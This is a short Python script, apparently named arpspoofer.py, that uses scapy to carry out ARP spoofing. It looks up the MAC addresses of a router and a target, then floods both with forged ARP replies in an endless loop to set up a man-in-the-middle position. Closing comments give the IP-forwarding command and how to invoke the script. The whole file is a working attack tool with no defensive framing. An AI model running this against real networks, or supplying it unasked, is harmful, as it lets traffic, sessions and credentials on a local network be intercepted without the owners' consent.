import scapy.all as scapy
import sys
import time


def get_mac_address(ip_address):
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')  # Requesting MAC
    arp_layer = scapy.ARP(pdst=ip_address)  # Destination to send packets to
    get_mac_packet = broadcast_layer / arp_layer
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]  # Sends and receives response
    return answer[0][1].hwsrc  # Response list -> Ether response


def spoof(router_ip, target_ip, router_mac, target_mac):
    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)  # Send packet to router from machine
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)  # Send packet to machine from router
    scapy.send(packet1)
    scapy.send(packet2)


target_ip = str(sys.argv[2])  # Read target ip (2nd arg input)
router_ip = str(sys.argv[1])  # Read router ip (1st arg input)
target_mac = str(get_mac_address(target_ip))  # Target MAC
router_mac = str(get_mac_address(router_ip))  # Router MAC

try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print('Closing ARP Spoofer.')
    exit(0)

# echo 1 >> /proc/sys/net/ipv4/ip_forward
# python3 arpspoofer.py <router ip> <machine ip>
